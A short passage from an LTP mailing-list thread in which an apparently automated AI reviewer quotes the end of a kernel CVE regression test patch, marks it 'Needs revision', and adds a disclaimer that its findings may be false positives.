-+		},
-+		{}
-+	},
-+	.tags = (const struct tst_tag[]) {
-+		{"linux-git", "2f4acd0fcd86"},
-+		{"CVE", "2026-64600"},
-+		{}
-+	},
-+};
+Verdict - Needs revision
 
 ---
-base-commit: d12a6186b60491cfa72e10944bd312e75b684c5e
-change-id: 20260724-cve-2026-64600-53fd6d627d63
+Note:
 
-Best regards,
--- 
-Andrea Cervesato <andrea.cervesato@suse.com>
+The agent can sometimes produce false positives although often its
+findings are genuine. If you find issues with the review, please
+comment this email or ignore the suggestions.
 
+Regards,
+LTP AI Reviewer
 
 -- 
 Mailing list info: https://lists.linux.it/listinfo/ltp
